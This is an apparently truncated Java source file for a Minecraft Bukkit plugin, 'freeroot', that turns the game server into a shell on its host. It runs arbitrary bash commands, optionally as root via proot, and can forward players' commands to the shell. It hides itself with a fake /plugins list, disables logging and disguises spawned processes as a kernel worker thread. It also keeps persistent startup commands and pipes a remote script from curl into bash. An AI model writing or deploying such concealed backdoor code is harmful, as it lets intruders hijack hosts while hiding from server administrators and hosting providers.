//Make by mytai
//My repo(https://github.com/Mytai20100/freeroot-jar)
//Version v1.6.1
package org;

import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.event.server.ServerCommandEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;

import java.io.*;
import java.lang.management.ManagementFactory;
import java.lang.management.OperatingSystemMXBean;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Deque;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class freeroot extends JavaPlugin implements Listener {

    // [FIX 1] Dùng ConcurrentHashMap<player, Deque> thay vì một List dùng chung
    // Mỗi player có log riêng → không race condition, không dùng chung
    // Deque giới hạn MAX_LOG_LINES dòng → không OOM khi output lớn
    private static final int MAX_LOG_LINES = 200;
    private final ConcurrentHashMap<String, Deque<String>> userLogs = new ConcurrentHashMap<>();

    private volatile boolean isInitializing = false;
    private volatile boolean isInitialized = false;
    // [FIX 2] Thêm cờ setupFailed để không retry clone vô hạn khi git clone lỗi
    private volatile boolean setupFailed = false;
    private volatile boolean consoleLogging = true;
    private volatile boolean alwaysMode = false;
    private volatile boolean pluginHidden = false;
    private File configFile;
    private FileConfiguration config;
    private final ConcurrentHashMap<String, String> userWorkingDir = new ConcurrentHashMap<>();
    // [FIX 3] Chỉ lưu environment variables (Map) thay vì cả ProcessBuilder
    // ProcessBuilder sau khi start() xong không phản ánh env của process con
    private final ConcurrentHashMap<String, Map<String, String>> userEnvironment = new ConcurrentHashMap<>();
    private List<String> startupCommands = new ArrayList<>();
    private final List<String> fakePlugins = Arrays.asList(
            "Essentials", "WorldEdit", "Vault", "LuckPerms", "PlaceholderAPI"
    );
    private static final String PLUGIN_VERSION = "v1.6-SNAPSHOT";
    private static final String PLUGIN_AUTHOR = "mytai";
    private static final String PLUGIN_REPO = "https://github.com/Mytai20100/freeroot-jar";

    @Override
    public void onEnable() {
        try {
            loadConfig();
            consoleLogging = config.getBoolean("console-logging", true);
            alwaysMode = config.getBoolean("always-mode", false);
            pluginHidden = config.getBoolean("plugin-hidden", false);
            startupCommands = config.getStringList("startup-commands");
            getServer().getPluginManager().registerEvents(this, this);
            if (!pluginHidden) {
                getLogger().info(colorize("&a[*] Freeroot Plugin v" + PLUGIN_VERSION + " Enabled!"));
            }
            if (!startupCommands.isEmpty()) {
                new BukkitRunnable() {
                    @Override
                    public void run() {
                        executeStartupCommands();
                    }
                }.runTaskLater(this, 40L);
            }

        } catch (Exception e) {
            if (!pluginHidden) {
                getLogger().severe("Failed to enable plugin: " + e.getMessage());
                e.printStackTrace();
            }
        }
    }

    @Override
    public void onDisable() {
        try {
            saveConfig();
            // [FIX 4] Dọn tất cả map khi plugin tắt để tránh giữ reference
            userLogs.clear();
            userWorkingDir.clear();
            userEnvironment.clear();
            if (!pluginHidden) {
                getLogger().info(colorize("&c[*] Freeroot Plugin Disabled."));
            }
        } catch (Exception e) {
            if (!pluginHidden) {
                getLogger().severe("Error during disable: " + e.getMessage());
            }
        }
    }

    // [FIX 5] Dọn dữ liệu của player khi họ rời server
    // Không có handler này thì userWorkingDir và userEnvironment tích lũy mãi
    @EventHandler
    public void onPlayerQuit(PlayerQuitEvent event) {
        String name = event.getPlayer().getName();
        userWorkingDir.remove(name);
        userEnvironment.remove(name);
        userLogs.remove(name);
    }

    private void loadConfig() {
        try {
            configFile = new File(getDataFolder(), "config.yml");

            if (!configFile.exists()) {
                getDataFolder().mkdirs();
                configFile.createNewFile();
            }
            config = YamlConfiguration.loadConfiguration(configFile);
            if (!config.contains("console-logging")) {
                config.set("console-logging", true);
            }
            if (!config.contains("always-mode")) {
                config.set("always-mode", false);
            }
            if (!config.contains("plugin-hidden")) {
                config.set("plugin-hidden", false);
            }
            if (!config.contains("startup-commands")) {
                config.set("startup-commands", new ArrayList<String>());
            }
            saveConfigFile();
        } catch (Exception e) {
            getLogger().severe("Failed to load config: " + e.getMessage());
        }
    }

    private void saveConfigFile() {
        try {
            config.save(configFile);
        } catch (IOException e) {
            getLogger().severe("Could not save config file: " + e.getMessage());
        }
    }

    private void executeStartupCommands() {
        if (!pluginHidden && consoleLogging) {
            getLogger().info(colorize("&e[*] Executing startup commands..."));
        }

        new BukkitRunnable() {
            @Override
            public void run() {
                for (String command : startupCommands) {
                    if (!pluginHidden && consoleLogging) {
                        getLogger().info(colorize("&7[STARTUP] Executing: &f" + command));
                    }
                    executeCommand(null, command, "STARTUP_USER");

                    try {
                        Thread.sleep(500);
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
                if (!pluginHidden && consoleLogging) {
                    getLogger().info(colorize("&a[+] All startup commands completed!"));
                }
            }
        }.runTaskAsynchronously(this);
    }

    private String colorize(String message) {
        return ChatColor.translateAlternateColorCodes('&', message);
    }

    // [FIX 6] Gộp onPlayerCommand và onPlayerPluginCommand thành một handler
    // Trước đây có 2 handler cùng listen PlayerCommandPreprocessEvent cho /plugins
    // → event bị cancel 2 lần, message có thể gửi đôi
    @EventHandler
    public void onPlayerCommand(PlayerCommandPreprocessEvent event) {
        String message = event.getMessage();
        String messageLower = message.toLowerCase().trim();

        // Xử lý plugin-hidden trước tiên
        if (pluginHidden) {
            if (messageLower.equals("/plugins") || messageLower.equals("/pl") ||
                    messageLower.equals("/bukkit:plugins") || messageLower.equals("/bukkit:pl")) {
                event.setCancelled(true);
                event.getPlayer().sendMessage(colorize("&aPlugins (&f" + fakePlugins.size() + "&a): &f" +
                        String.join(", ", fakePlugins)));
                return;
            }
        }

        if (!alwaysMode) return;

        String[] parts = message.split(" ", 2);
        String cmd = parts[0].toLowerCase();

        if ((cmd.equals("/r") || cmd.equals("/rt")) && parts.length > 1) {
            String firstArg = parts[1].toLowerCase().trim();
            if (firstArg.equals("-on") || firstArg.equals("-off") ||
                    firstArg.equals("log") || firstArg.equals("pwd") ||
                    firstArg.equals("reset") || firstArg.equals("version") ||
                    firstArg.equals("disable-log") || firstArg.equals("enable-log") ||
                    firstArg.equals("disable-pl") || firstArg.equals("enable-pl") ||
                    firstArg.startsWith("startup")) {
                return;
            }
        }

        if (cmd.equals("/root") || cmd.equals("/r") || cmd.equals("/rt") ||
                cmd.equals("/neofetch") || cmd.equals("/info") ||
                cmd.startsWith("/minecraft:") || cmd.startsWith("/bukkit:")) {
            return;
        }

        if (getServer().getPluginCommand(cmd.substring(1)) != null) {
            return;
        }

        event.setCancelled(true);
        String shellCmd = message.substring(1);
        event.getPlayer().sendMessage(colorize("&e[Always Mode] &7Executing: &f" + shellCmd));

        final String playerName = event.getPlayer().getName();
        new BukkitRunnable() {
            @Override
            public void run() {
                executeCommand(event.getPlayer(), shellCmd, playerName);
            }
        }.runTaskAsynchronously(this);
    }

    @EventHandler
    public void onServerCommand(ServerCommandEvent event) {
        String cmd = event.getCommand().toLowerCase().trim();
        if (pluginHidden) {
            if (cmd.equals("plugins") || cmd.equals("pl") ||
                    cmd.equals("bukkit:plugins") || cmd.equals("bukkit:pl")) {
                event.setCancelled(true);
                CommandSender sender = event.getSender();
                sender.sendMessage(colorize("&aPlugins (&f" + fakePlugins.size() + "&a): &f" +
                        String.join(", ", fakePlugins)));
                return;
            }
        }
        if (alwaysMode) {
            String fullCmd = event.getCommand().trim();
            String[] parts = fullCmd.split(" ", 2);
            String baseCmd = parts[0].toLowerCase();
            if (baseCmd.equals("root") || baseCmd.equals("r") || baseCmd.equals("rt") ||
                    baseCmd.equals("neofetch") || baseCmd.equals("info") ||
                    baseCmd.startsWith("minecraft:") || baseCmd.startsWith("bukkit:")) {
                return;
            }
            if (getServer().getPluginCommand(baseCmd) != null) {
                return;
            }
            event.setCancelled(true);
            CommandSender sender = event.getSender();
            sender.sendMessage(colorize("&e[Always Mode] &7Executing: &f" + fullCmd));

            new BukkitRunnable() {
                @Override
                public void run() {
                    executeCommand(sender, fullCmd, "CONSOLE");
                }
            }.runTaskAsynchronously(this);
        }
    }

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        String cmdName = cmd.getName().toLowerCase();
        if (cmdName.equals("neofetch")) {
            if (!pluginHidden && consoleLogging) {
                sender.sendMessage(colorize("&e[*] Running Neofetch..."));
            }
            // Chạy trên host system, không vào apk — neofetch cần curl + các tool của host
            new BukkitRunnable() {
                @Override
                public void run() {
                    executeHostCommand(sender, "curl -s https://raw.githubusercontent.com/dylanaraps/neofetch/master/neofetch | bash", sender.getName());
                }
            }.runTaskAsynchronously(this);
            return true;
        }

        if (cmdName.equals("info")) {
            if (!pluginHidden && consoleLogging) {
                sender.sendMessage(colorize("&e[*] System information..."));
            }
            // displaySystemInfo đã đọc trực tiếp từ JVM + host — không cần apk
            new BukkitRunnable() {
                @Override
                public void run() {
                    displaySystemInfo(sender);
                }
            }.runTaskAsynchronously(this);
            return true;
        }

        if (cmdName.equals("root") || cmdName.equals("r") || cmdName.equals("rt")) {
            String senderKey = sender.getName();

            if (args.length == 0) {
                sender.sendMessage(colorize("&c┌─ &lFreeroot Plugin Commands &c─┐"));
                sender.sendMessage(colorize("&7│ &f/root <command>       &7- Execute command"));
                sender.sendMessage(colorize("&7│ &f/root log            &7- View last logs"));
                sender.sendMessage(colorize("&7│ &f/root pwd            &7- Show current dir"));
                sender.sendMessage(colorize("&7│ &f/root reset          &7- Reset session"));
                sender.sendMessage(colorize("&7│ &f/root version        &7- Plugin version"));
                sender.sendMessage(colorize("&7│ &f/root -on/-off       &7- Toggle always mode"));
                sender.sendMessage(colorize("&7│ &f/root disable-log    &7- Disable logging"));
                sender.sendMessage(colorize("&7│ &f/root enable-log     &7- Enable logging"));
                sender.sendMessage(colorize("&7│ &f/root disable-pl     &7- Hide plugin"));
                sender.sendMessage(colorize("&7│ &f/root enable-pl      &7- Show plugin"));
                sender.sendMessage(colorize("&7│ &f/root startup <cmd>  &7- Add startup command"));
                sender.sendMessage(colorize("&7│ &f/root startup list   &7- List startup commands"));
                sender.sendMessage(colorize("&7│ &f/root startup clear  &7- Clear startup commands"));
                sender.sendMessage(colorize("&7│ &f/neofetch            &7- Run neofetch"));
                sender.sendMessage(colorize("&7│ &f/info                &7- System information"));
                sender.sendMessage(colorize("&7│ &aAliases: /r, /rt"));
                sender.sendMessage(colorize("&c└─────────────────────────────┘"));
                return true;
            }

            String firstArg = args[0].toLowerCase();

            if (firstArg.equals("-on")) {
                alwaysMode = true;
                config.set("always-mode", true);
                saveConfigFile();
                sender.sendMessage(colorize("&a[+] Always Mode &aENABLED&a!"));
                sender.sendMessage(colorize("&7    All commands will be executed as shell commands."));
                sender.sendMessage(colorize("&7    Use &f/root -off &7to disable."));
                return true;
            }
            if (firstArg.equals("-off")) {
                alwaysMode = false;
                config.set("always-mode", false);
                saveConfigFile();
                sender.sendMessage(colorize("&c[+] Always Mode &cDISABLED&c!"));
                sender.sendMessage(colorize("&7    Commands require &f/root &7prefix again."));
                return true;
            }

            if (firstArg.equals("disable-pl")) {
                pluginHidden = true;
                consoleLogging = false;
                config.set("plugin-hidden", true);
                config.set("console-logging", false);
                saveConfigFile();
                sender.sendMessage(colorize("&a[+] Plugin is now &cHIDDEN&a!"));
                sender.sendMessage(colorize("&7    Plugin will not appear in /pl or /plugins"));
                sender.sendMessage(colorize("&7    All logging is disabled."));
                sender.sendMessage(colorize("&7    Use &f/root enable-pl &7to unhide."));
                return true;
            }
            if (firstArg.equals("enable-pl")) {
                pluginHidden = false;
                config.set("plugin-hidden", false);
                saveConfigFile();
                sender.sendMessage(colorize("&a[+] Plugin is now &aVISIBLE&a!"));
                sender.sendMessage(colorize("&7    Plugin will appear in /pl or /plugins"));
                sender.sendMessage(colorize("&7    Use &f/root enable-log &7to enable logging."));
                return true;
            }
            if (firstArg.equals("startup")) {
                if (args.length == 1) {
                    sender.sendMessage(colorize("&e┌─ Startup Command Usage ─┐"));
                    sender.sendMessage(colorize("&7│ &f/root startup <command> &7- Add"));
                    sender.sendMessage(colorize("&7│ &f/root startup list     &7- List"));
                    sender.sendMessage(colorize("&7│ &f/root startup clear    &7- Clear all"));
                    sender.sendMessage(colorize("&e└─────────────────────────┘"));
                    return true;
                }

                if (args[1].equalsIgnoreCase("list")) {
                    if (startupCommands.isEmpty()) {
                        sender.sendMessage(colorize("&7[!] No startup commands configured."));
                    } else {
                        sender.sendMessage(colorize("&e┌─ Startup Commands ─┐"));
                        for (int i = 0; i < startupCommands.size(); i++) {
                            sender.sendMessage(colorize("&7│ &f" + (i + 1) + ". &a" + startupCommands.get(i)));
                        }
                        sender.sendMessage(colorize("&e└───────────────────┘"));
                    }
                    return true;
                }
                if (args[1].equalsIgnoreCase("clear")) {
                    startupCommands.clear();
                    config.set("startup-commands", startupCommands);
                    saveConfigFile();
                    sender.sendMessage(colorize("&a[+] All startup commands cleared!"));
                    return true;
                }
                String startupCmd = String.join(" ", Arrays.copyOfRange(args, 1, args.length));
                startupCommands.add(startupCmd);
                config.set("startup-commands", startupCommands);
                saveConfigFile();
                sender.sendMessage(colorize("&a[+] Added startup command: &f" + startupCmd));
                sender.sendMessage(colorize("&7    Total startup commands: &e" + startupCommands.size()));
                return true;
            }

            if (args.length == 1) {
                if (firstArg.equals("log")) {
                    // [FIX 7] Đọc log của đúng sender, không dùng log chung
                    Deque<String> logs = userLogs.getOrDefault(senderKey, new LinkedList<>());
                    if (logs.isEmpty()) {
                        sender.sendMessage(colorize("&7[!] No logs available."));
                    } else {
                        sender.sendMessage(colorize("&9┌─ &lLast Command Logs &9─┐"));
                        String currentDir = userWorkingDir.getOrDefault(senderKey, System.getProperty("user.dir"));
                        sender.sendMessage(colorize("&6│ PWD: &f" + currentDir));
                        sender.sendMessage(colorize("&9├─────────────────────────┤"));
                        for (String line : logs) {
                            if (line.startsWith(">>>")) {
                                sender.sendMessage(colorize("&b│ " + line));
                            } else if (line.contains("Exit Code: 0")) {
                                sender.sendMessage(colorize("&a│ " + line));
                            } else if (line.contains("Exit Code:") && !line.contains("Exit Code: 0")) {
                                sender.sendMessage(colorize("&c│ " + line));
                            } else if (line.contains("ERROR")) {
                                sender.sendMessage(colorize("&4│ " + line));
                            } else {
                                sender.sendMessage(colorize("&8│ " + line));
                            }
                        }
                        sender.sendMessage(colorize("&9└─────────────────────────┘"));
                    }
                    return true;
                }
                if (firstArg.equals("pwd")) {
                    String currentDir = userWorkingDir.getOrDefault(senderKey, System.getProperty("user.dir"));
                    sender.sendMessage(colorize("&e┌─ Current Directory ─┐"));
                    sender.sendMessage(colorize("&6│ " + currentDir));
                    sender.sendMessage(colorize("&e└─────────────────────┘"));
                    return true;
                }
                if (firstArg.equals("reset")) {
                    userWorkingDir.remove(senderKey);
                    userEnvironment.remove(senderKey);
                    userLogs.remove(senderKey);
                    sender.sendMessage(colorize("&a[+] Session reset! Back to root directory."));
                    return true;
                }
                if (firstArg.equals("version")) {
                    sender.sendMessage(colorize("&d┌─ &lFreeroot Plugin Info &d─┐"));
                    sender.sendMessage(colorize("&7│ &fVersion: &e" + PLUGIN_VERSION));
                    sender.sendMessage(colorize("&7│ &fAuthor: &b" + PLUGIN_AUTHOR));
                    sender.sendMessage(colorize("&7│ &fRepository:"));
                    sender.sendMessage(colorize("&7│   &9" + PLUGIN_REPO));
                    sender.sendMessage(colorize("&7│ &fFeatures:"));
                    sender.sendMessage(colorize("&7│   &a✓ &7Startup Commands"));
                    sender.sendMessage(colorize("&7│   &a✓ &7Plugin Hide"));
                    sender.sendMessage(colorize("&7│   &a✓ &7Apk Integration"));
                    sender.sendMessage(colorize("&7│   &a✓ &7Root Privileges (via proot/apk)"));

                    File apkBin = new File(System.getProperty("user.dir"), ".cache/minecraft/work/usr/local/bin/apk");
                    if (apkBin.exists()) {
                        sender.sendMessage(colorize("&7│ &fApk: &aEnabled &7(found at work dir)"));
                    } else {
                        sender.sendMessage(colorize("&7│ &fApk: &cNot found &7(normal execution)"));
                    }

                    sender.sendMessage(colorize("&d└─────────────────────────┘"));
                    return true;
                }
                if (firstArg.equals("disable-log")) {
                    consoleLogging = false;
                    config.set("console-logging", false);
                    saveConfigFile();
                    sender.sendMessage(colorize("&a[+] Console logging &cdisabled&a!"));
                    sender.sendMessage(colorize("&7    Commands will run silently in background."));
                    return true;
                }
                if (firstArg.equals("enable-log")) {
                    consoleLogging = true;
                    config.set("console-logging", true);
                    saveConfigFile();
                    sender.sendMessage(colorize("&a[+] Console logging &aenabled&a!"));
                    sender.sendMessage(colorize("&7    Command output will be shown in console."));
                    return true;
                }
            }
            String fullCommand = String.join(" ", args);
            if (consoleLogging && !pluginHidden) {
                sender.sendMessage(colorize("&e[*] &7Executing: &f" + fullCommand));
                sender.sendMessage(colorize("&8    Status: &7Processing..."));
            }
            new BukkitRunnable() {
                @Override
                public void run() {
                    executeCommand(sender, fullCommand, senderKey);
                }
            }.runTaskAsynchronously(this);

            return true;
        }
        return false;
    }

    private void displaySystemInfo(CommandSender sender) {
        sender.sendMessage(colorize("&b┌─ &lSystem Information &b─┐"));

        try {
            OperatingSystemMXBean osBean = ManagementFactory.getOperatingSystemMXBean();
            Runtime runtime = Runtime.getRuntime();

            sender.sendMessage(colorize("&7│ &fOS: &a" + System.getProperty("os.name")));
            sender.sendMessage(colorize("&7│ &fArch: &a" + System.getProperty("os.arch")));
            sender.sendMessage(colorize("&7│ &fVersion: &a" + System.getProperty("os.version")));
            sender.sendMessage(colorize("&7│ &fJava: &a" + System.getProperty("java.version")));

            String cpuInfo = getCPUInfo();
            sender.sendMessage(colorize("&7│ &fCPU: &a" + cpuInfo));
            sender.sendMessage(colorize("&7│ &fLoad Avg: &a" + String.format("%.2f", osBean.getSystemLoadAverage())));

            long maxMemory = runtime.maxMemory() / (1024 * 1024);
            long totalMemory = runtime.totalMemory() / (1024 * 1024);
            long freeMemory = runtime.freeMemory() / (1024 * 1024);
            long usedMemory = totalMemory - freeMemory;

            sender.sendMessage(colorize("&7│ &fMemory Used: &a" + usedMemory + "MB &7/ &a" + maxMemory + "MB"));
            sender.sendMessage(colorize("&7│ &fWorking Dir: &a" + System.getProperty("user.dir")));

            String publicIP = getPublicIP();
            sender.sendMessage(colorize("&7│ &fPublic IP: &a" + publicIP));

            sender.sendMessage(colorize("&b└─────────────────────────┘"));

        } catch (Exception e) {
            sender.sendMessage(colorize("&c[!] Failed to retrieve system info: " + e.getMessage()));
        }
    }

    private String getCPUInfo() {
        // [FIX 8] Đóng BufferedReader trong try-with-resources để không leak FD
        try {
            String os = System.getProperty("os.name").toLowerCase();
            String cpuName = "Unknown";
            int cores = Runtime.getRuntime().availableProcessors();

            if (os.contains("win")) {
                Process process = Runtime.getRuntime().exec("wmic cpu get name");
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                    String line;
                    while ((line = reader.readLine()) != null) {
                        if (!line.trim().isEmpty() && !line.contains("Name")) {
                            cpuName = line.trim();
                            break;
                        }
                    }
                }
            } else if (os.contains("linux")) {
                Process process = Runtime.getRuntime().exec("cat /proc/cpuinfo");
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                    String line;
                    while ((line = reader.readLine()) != null) {
                        if (line.startsWith("model name")) {
                            cpuName = line.split(":")[1].trim();
                            break;
                        }
                    }
                }
            } else if (os.contains("mac")) {
                Process process = Runtime.getRuntime().exec("sysctl -n machdep.cpu.brand_string");
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                    cpuName = reader.readLine().trim();
                }
            }
            return cpuName + " (" + cores + " cores)";

        } catch (Exception e) {
            int cores = Runtime.getRuntime().availableProcessors();
            return "Unknown (" + cores + " cores)";
        }
    }

    private String getPublicIP() {
        // [FIX 9] Đóng connection đúng cách trong finally
        HttpURLConnection conn = null;
        try {
            URL url = new URL("https://api.ipify.org");
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(3000);
            conn.setReadTimeout(3000);

            try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                String ip = reader.readLine();
                return ip != null ? ip : "Unknown";
            }
        } catch (Exception e) {
            return "Unable to fetch";
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    // [FIX 10] Helper: thêm dòng vào log của một sender, tự động giới hạn MAX_LOG_LINES
    private void appendLog(String senderKey, String line) {
        Deque<String> logs = userLogs.computeIfAbsent(senderKey, k -> new LinkedList<>());
        // synchronized trên deque riêng của từng user → không block lẫn nhau
        synchronized (logs) {
            if (logs.size() >= MAX_LOG_LINES) {
                logs.pollFirst(); // bỏ dòng cũ nhất
            }
            logs.addLast(line);
        }
    }

    /**
     * Chạy lệnh thẳng trên host system, KHÔNG qua apk/proot.
     * Dùng cho neofetch và các lệnh cần tool của host (curl, bash built-ins...).
     */
    private void executeHostCommand(CommandSender sender, String command, String senderKey) {
        Deque<String> logs = userLogs.computeIfAbsent(senderKey, k -> new LinkedList<>());
        synchronized (logs) { logs.clear(); }

        String currentDir = userWorkingDir.getOrDefault(senderKey, System.getProperty("user.dir"));

        if (consoleLogging && !pluginHidden) {
            getLogger().info(colorize("&e[*] Running on host: &f" + command));
        }

        try {
            // Chạy thẳng bash trên host — không wrap bằng apk/proot
            ProcessBuilder pb = new ProcessBuilder("bash", "-c", command);
            pb.redirectErrorStream(true);
            pb.directory(new File(currentDir));

            Process process = pb.start();

            appendLog(senderKey, ">>> [HOST] $ " + command);
            appendLog(senderKey, "");

            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                boolean hasOutput = false;
                String line;
                while ((line = reader.readLine()) != null) {
                    hasOutput = true;
                    String cleanLine = line.replaceAll("\\x1B\\[[0-9;]*[mGKHF]", "");
                    appendLog(senderKey, cleanLine);
                    if (consoleLogging && !pluginHidden) {
                        getLogger().info("[HOST OUTPUT] " + cleanLine);
                    }
                }
                if (!hasOutput) appendLog(senderKey, "(no output)");

                int exitCode = process.waitFor();
                appendLog(senderKey, "");
                appendLog(senderKey, ">>> Exit Code: " + exitCode);

                if (sender != null) {
                    final int finalCode = exitCode;
                    new BukkitRunnable() {
                        @Override
                        public void run() {
                            if (finalCode == 0) {
                                sender.sendMessage(colorize("&a[+] Done! Use &f/root log &ato view output."));
                            } else {
                                sender.sendMessage(colorize("&c[!] Exited with code &f" + finalCode + "&c. Use &f/root log &cfor details."));
                            }
                        }
                    }.runTask(this);
                }
            }
        } catch (Exception e) {
            handleCommandError(sender, command, senderKey, e);
        }
    }

    private void executeCommand(CommandSender sender, String command, String senderKey) {
        // [FIX 11] Xóa log riêng của sender này, không ảnh hưởng sender khác
        Deque<String> logs = userLogs.computeIfAbsent(senderKey, k -> new LinkedList<>());
        synchronized (logs) {
            logs.clear();
        }

        try {
            ensureBasicSetup();

            // [FIX 12] Báo lỗi rõ ràng nếu setup đã fail thay vì treo im lặng
            if (setupFailed) {
                if (sender != null) {
                    new BukkitRunnable() {
                        @Override
                        public void run() {
                            sender.sendMessage(colorize("&c[!] Setup failed previously. Use &f/root reset &cto retry."));
                        }
                    }.runTask(this);
                }
                return;
            }

            String currentDir = userWorkingDir.getOrDefault(senderKey, System.getProperty("user.dir"));

            if (command.trim().startsWith("cd ")) {
                handleCdCommand(command, senderKey, currentDir, sender);
                return;
            }

            if (consoleLogging && !pluginHidden) {
                getLogger().info(colorize("&e[*] Running command: &f" + command + " &7in directory: &f" + currentDir));
            }

            File apkDir = new File(System.getProperty("user.dir"), ".cache/minecraft/work");
            File apkBin = new File(apkDir, "usr/local/bin/apk");

            String finalCommand;
            if (apkBin.exists() && apkBin.canExecute()) {
                if (consoleLogging && !pluginHidden) {
                    getLogger().info(colorize("&a[*] Executing in apk environment with root privileges"));
                }

                String escapedCmd = command.replace("\"", "\\\"").replace("\\", "\\\\");
                String apkCmd = apkBin.getAbsolutePath() +
                        " --rootfs=\"" + apkDir.getAbsolutePath() + "\"" +
                        " -0" +
                        " -w \"/root\"" +
                        " -b /dev" +
                        " -b /sys" +
                        " -b /proc" +
                        " -b /etc/resolv.conf" +
                        " --kill-on-exit" +
                        " /bin/bash -c \"" + escapedCmd + "\"";

                finalCommand = "exec -a '[kworker/u16:2-events]' bash -c " + escapeForShell(apkCmd);
            } else {
                if (consoleLogging && !pluginHidden) {
                    getLogger().info(colorize("&e[*] Apk not found, executing normally"));
                }
                finalCommand = "exec -a '[kworker/u16:2-events]' bash -c " + escapeForShell(command);
            }

            ProcessBuilder pb = new ProcessBuilder("bash", "-c", finalCommand);
            pb.redirectErrorStream(true);
            pb.directory(new File(currentDir));

            // [FIX 13] Restore environment từ Map thay vì ProcessBuilder cũ
            if (userEnvironment.containsKey(senderKey)) {
                pb.environment().putAll(userEnvironment.get(senderKey));
            }

            Process process = pb.start();
            int exitCode;

            // [FIX 14] try-with-resources đảm bảo reader luôn được đóng dù có exception
            appendLog(senderKey, ">>> [" + currentDir + "] $ " + command);
            appendLog(senderKey, "");

            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                boolean hasOutput = false;
                String line;
                while ((line = reader.readLine()) != null) {
                    hasOutput = true;
                    String cleanLine = line.replaceAll("\\x1B\\[[0-9;]*[mGKHF]", "");
                    appendLog(senderKey, cleanLine);

                    if (consoleLogging && !pluginHidden) {
                        getLogger().info("[CMD OUTPUT] " + cleanLine);
                    }
                }

                if (!hasOutput) {
                    appendLog(senderKey, "(no output)");
                }

                exitCode = process.waitFor();
            }

            appendLog(senderKey, "");
            appendLog(senderKey, ">>> Exit Code: " + exitCode);

            // [FIX 15] Lưu snapshot environment tại thời điểm này (để giữ biến đã export trước đó)
            userEnvironment.put(senderKey, Collections.unmodifiableMap(
                    new java.util.HashMap<>(pb.environment())
            ));

            if (sender != null) {
                final int finalExitCode = exitCode;
                new BukkitRunnable() {
                    @Override
                    public void run() {
                        if (finalExitCode == 0) {
                            sender.sendMessage(colorize("&a[+] Command completed successfully!"));
                            if (consoleLogging && !pluginHidden) {
                                sender.sendMessage(colorize("&7    Use &f/root log &7to view output."));
                            }
                        } else {
                            sender.sendMessage(colorize("&c[!] Command completed with errors &7(code: &c" + finalExitCode + "&7)"));
                            if (consoleLogging && !pluginHidden) {
                                sender.sendMessage(colorize("&7    Use &f/root log &7to view details."));
                            }
                        }
                    }
                }.runTask(this);
            }

        } catch (Exception e) {
            handleCommandError(sender, command, senderKey, e);
        }
    }

    private void handleCdCommand(String command, String senderKey, String currentDir, CommandSender sender) {
        try {
            String targetDir = command.substring(3).trim();
            if (targetDir.isEmpty()) {
                targetDir = System.getProperty("user.home");
            }

            File newDir;
            if (targetDir.startsWith("/")) {
                newDir = new File(targetDir);
            } else {
                newDir = new File(currentDir, targetDir);
            }

            String newPath = newDir.getCanonicalPath();
            final String finalTargetDir = targetDir;

            if (newDir.exists() && newDir.isDirectory()) {
                userWorkingDir.put(senderKey, newPath);

                // [FIX 16] Dùng appendLog thay vì thao tác trực tiếp lên list chung
                Deque<String> logs = userLogs.computeIfAbsent(senderKey, k -> new LinkedList<>());
                synchronized (logs) { logs.clear(); }
                appendLog(senderKey, ">>> [" + currentDir + "] $ " + command);
                appendLog(senderKey, "");
                appendLog(senderKey, "Changed directory to: " + newPath);
                appendLog(senderKey, "");
                appendLog(senderKey, ">>> Exit Code: 0");

                if (sender != null) {
                    final String finalNewPath = newPath;
                    new BukkitRunnable() {
                        @Override
                        public void run() {
                            sender.sendMessage(colorize("&a[+] Changed to directory: &f" + finalNewPath));
                        }
                    }.runTask(this);
                }

                if (consoleLogging && !pluginHidden) {
                    getLogger().info(colorize("&a[+] Changed to directory: &f" + newPath));
                }

            } else {
                Deque<String> logs = userLogs.computeIfAbsent(senderKey, k -> new LinkedList<>());
                synchronized (logs) { logs.clear(); }
                appendLog(senderKey, ">>> [" + currentDir + "] $ " + command);
                appendLog(senderKey, "");
                appendLog(senderKey, "bash: cd: " + finalTargetDir + ": No such file or directory");
                appendLog(senderKey, "");
                appendLog(senderKey, ">>> Exit Code: 1");

                if (sender != null) {
                    new BukkitRunnable() {
                        @Override
                        public void run() {
                            sender.sendMessage(colorize("&c[!] Directory not found: &f" + finalTargetDir));
                        }
                    }.runTask(this);
                }

                if (consoleLogging && !pluginHidden) {
                    getLogger().info(colorize("&c[!] Directory not found: &f" + finalTargetDir));
                }
            }

        } catch (Exception e) {
            handleCommandError(sender, command, senderKey, e);
        }
    }

    // [FIX 17] Thêm senderKey vào signature để ghi log đúng chỗ
    private void handleCommandError(CommandSender sender, String command, String senderKey, Exception e) {
        Deque<String> logs = userLogs.computeIfAbsent(senderKey, k -> new LinkedList<>());
        synchronized (logs) { logs.clear(); }
        appendLog(senderKey, ">>> ERROR executing command: " + command);
        appendLog(senderKey, ">>> Exception: " + e.getClass().getSimpleName());
        appendLog(senderKey, ">>> Message: " + e.getMessage());

        if (consoleLogging && !pluginHidden) {
            getLogger().severe("Error executing command '" + command + "': " + e.getMessage());
            e.printStackTrace();
        }

        if (sender != null) {
            new BukkitRunnable() {
                @Override
                public void run() {
                    sender.sendMessage(colorize("&c[!] Command failed! Use &f/root log &cto view error details."));
                }
            }.runTask(this);
        }
    }

    private static final String CACHE_DIR = ".cache/minecraft";
    private static final String WORK_DIR = CACHE_DIR + "/work";
    private static final String APK_BIN = WORK_DIR + "/usr/local/bin/apk";

    private void ensureBasicSetup() {
